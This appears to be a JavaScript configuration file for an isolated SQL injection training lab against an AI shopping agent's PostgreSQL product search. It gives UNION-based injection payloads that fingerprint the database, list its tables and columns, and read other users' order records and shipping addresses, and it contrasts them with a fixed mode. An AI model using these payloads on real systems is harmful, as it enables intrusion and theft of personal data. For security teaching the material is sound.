'use strict';
module.exports = base => ({
  ...base,
  sqli_1: {
    ...base.sqli_1,
    approach: `In vulnerable mode, the ARIA agent's product search concatenates your input directly into a PostgreSQL LIKE query without sanitization:
  SELECT ... FROM products WHERE name LIKE '%YOUR_INPUT%'

A single quote (') breaks the string delimiter and PostgreSQL reports a syntax or unterminated-quoted-string error. That real database error reveals the injection point. In fixed mode the same character is bound as data and cannot change the query structure.`,
    tips: [
      'A PostgreSQL syntax or unterminated-quoted-string error confirms that the vulnerable query structure was changed.',
      'In a real application this error may be hidden, but the behavior change (error versus an empty result) can still reveal the injection point.',
      'This is Step 1 of a SQL injection assessment: compare the single-quote probe with a bound literal search.',
    ],
  },
  sqli_3: {
    ...base.sqli_3,
    approach: `The products SELECT returns 8 columns: id, product_id, name, category, price, description, stock, available.

  Injected: WHERE name LIKE '%' ORDER BY 8-- (succeeds — position 8 is in the select list)
  Injected: WHERE name LIKE '%' ORDER BY 9-- (PostgreSQL rejects position 9 because it is outside the select list)

Use separate ordered probes and retain both results. The highest successful position followed by the next-position boundary error establishes the column count before a UNION SELECT.`,
    tips: [
      'Keep the successful ORDER BY 8 receipt and the failing ORDER BY 9 receipt; either probe alone is incomplete evidence.',
      "PostgreSQL reports that ORDER BY position 9 is not in the select list; it does not emit SQLite's 'no such column' error.",
      'You can also use ORDER BY with column names if you already know the schema.',
    ],
  },
  sqli_4: {...base.sqli_4, approach: 'Inject a UNION SELECT with one NULL against the eight-column products SELECT. PostgreSQL rejects this with "each UNION query must have the same number of columns". Add NULL placeholders until the column counts match.'},
  sqli_6: {...base.sqli_6, tips: ['Products columns 2, 3, 4 and 6 accept text; columns 1, 5, 7 and 8 require numeric-compatible values.', 'Place a distinctive text marker in column 3, then replace it with version() for engine discovery.']},
  sqli_7: {
    ...base.sqli_7,
    hints: ['PostgreSQL version() returns the server version as text.', 'Put version() in column 3 of the eight-column UNION.'],
    examples: ["search for %' UNION SELECT NULL,NULL,version(),NULL,NULL,NULL,NULL,NULL--"],
    approach: 'The product name is a text column. A UNION row containing version() there discloses the actual PostgreSQL release through the search response.',
    tips: ['current_setting(\'server_version\') is another PostgreSQL version query.', 'Use the version to choose PostgreSQL syntax; SQLite-specific functions do not exist here.'],
  },
  sqli_8: {
    ...base.sqli_8,
    hints: ['pg_catalog.pg_tables contains table names and schemas.', "Filter schemaname='aria' to discover this isolated workshop's tables."],
    examples: ["search for %' UNION SELECT NULL,NULL,tablename::text,NULL,NULL,NULL,NULL,NULL FROM pg_catalog.pg_tables WHERE schemaname='aria'--"],
    approach: 'Place the catalog tablename in text column 3. PostgreSQL catalogs expose metadata; this exercise discovers products, orders, receipts, cart and chat_history in the aria schema.',
    tips: ['Schema qualification distinguishes workshop objects from catalog objects.', 'Catalog visibility does not grant access to platform data; the runtime role is limited to its lab database.'],
  },
  sqli_9: {
    ...base.sqli_9,
    hints: ['information_schema.columns lists column_name and data_type.', "Filter table_schema='aria' AND table_name='orders'."],
    examples: ["search for %' UNION SELECT NULL,NULL,column_name::text,NULL,NULL,data_type::text,NULL,NULL FROM information_schema.columns WHERE table_schema='aria' AND table_name='orders'--"],
    approach: 'Return column names in product-name position 3 and data types in description position 6. This enumerates the orders structure without pretending PostgreSQL provides a sqlite_master CREATE TABLE string.',
    tips: ['Look for user_id, shipping_address, payment_method and total_amount.', 'Keep text data in text-compatible UNION positions.'],
  },
  sqli_10: {
    ...base.sqli_10,
    examples: ["search for %' UNION SELECT NULL,NULL,order_number,user_id,total_amount,shipping_address,NULL,NULL FROM aria.orders--"],
    approach: 'The injectable search can read synthetic order records in aria.orders, bypassing the normal tool-level user filter. Columns 3 and 4 return order number and user ID, numeric column 5 returns total amount, and text column 6 returns shipping address. Fixed mode treats the entire input as a bound search string.',
    tips: ['Use aria.orders to address the private workshop schema.', 'Shipping addresses belong in text column 6, not numeric price column 5.'],
  },
});
